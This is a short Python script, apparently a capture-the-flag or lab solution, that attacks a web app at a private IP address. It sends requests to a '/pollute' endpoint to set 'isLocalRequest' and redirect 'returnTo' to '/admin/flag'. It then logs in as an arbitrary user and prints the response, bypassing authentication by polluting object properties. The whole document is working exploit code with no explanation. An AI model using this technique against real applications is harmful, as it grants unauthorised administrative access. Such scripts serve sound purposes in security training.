# %%
import requests

# %%
url = 'http://10.10.15.10:3000'

requests.get(url + '/pollute/userProperty/isLocalRequest')
requests.get(url + '/pollute/returnTo/%2Fadmin%2Fflag')
r = requests.get(url + '/auth?username=a')
print(r.content)


